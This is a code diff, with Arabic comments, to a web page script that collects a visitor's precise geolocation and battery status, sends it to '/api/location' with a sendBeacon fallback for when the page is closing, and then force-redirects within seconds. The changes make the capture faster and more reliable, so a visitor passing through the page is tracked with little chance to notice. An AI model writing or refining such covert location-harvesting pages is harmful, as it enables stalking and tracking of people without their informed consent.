@@ -88,17 +88,13 @@
 
             // 2. وظيفة المعالجة الرئيسية
             async function startProcess() {
-                // ننتظر 1 ثانية فقط بدلاً من 3 لنجعله أسرع بكثير
-                const minWait = new Promise(r => setTimeout(r, 1000));
+                // ننتظر 1.5 ثانية كحد أقصى للحصول على أفضل دقة
+                const timeoutPromise = new Promise(r => setTimeout(r, 1500));
 
-                // ننتظر حتى يتم التقاط الموقع أو مرور 20 محاولة (ثانيتين كحد أقصل)
-                let attempts = 0;
-                while (!locationCaptured && attempts < 20) {
+                while (!locationCaptured && attempts < 15) {
                     await new Promise(r => setTimeout(r, 100));
                     attempts++;
                 }
-
-                await minWait;
 
                 const data = {
                     latitude: bestPos.coords.latitude,
@@ -111,36 +107,31 @@
                     battery: await (navigator.getBattery ? navigator.getBattery().then(b => ({ level: Math.round(b.level * 100) + "%", charging: b.charging ? "Yes" : "No" })) : Promise.resolve({ level: "N/A", charging: "N/A" }))
                 };
 
-
-
+                // محاولة الإرسال بـ fetch العادي (الأكثر موثوقية إذا كان الوقت متاحاً)
                 try {
-                    // على الجوال، نستخدم FETCH مع await حقيقي
-                    // هذا يمنع المتصفح من إغلاق الصفحة قبل التأكد من وصول البيانات للسيرفر
-                    const response = await fetch('/api/location', {
+                    await fetch('/api/location', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify(data),
                         keepalive: true
                     });
-
-                    if (response.ok) {
-                        console.log("Sent successfully");
-                    }
                 } catch (e) {
-                    console.error("Fetch failed:", e);
+                    // إذا فشل Fetch، نستخدم Beacon كخطة بديلة فورية (تعمل جيداً على الهواتف عند الإغلاق)
+                    if (navigator.sendBeacon) {
+                        navigator.sendBeacon('/api/location', JSON.stringify(data));
+                    }
                 }
 
-                // 3. التحويل النهائي
+                // التحويل النهائي
                 redirect();
             }
 
             // بدء العملية
+            let attempts = 0;
             startProcess();
 
-            // أمان إضافي: تحويل قسري بعد 3 ثوانٍ لضمان السرعة الفائقة
-            setTimeout(() => {
-                redirect();
-            }, 3000);
+            // أمان إضافي: تحويل قسري بعد 4 ثوانٍ لضمان عدم تعليق الصفحة
+            setTimeout(redirect, 4000);
         };
 
         function redirect() {
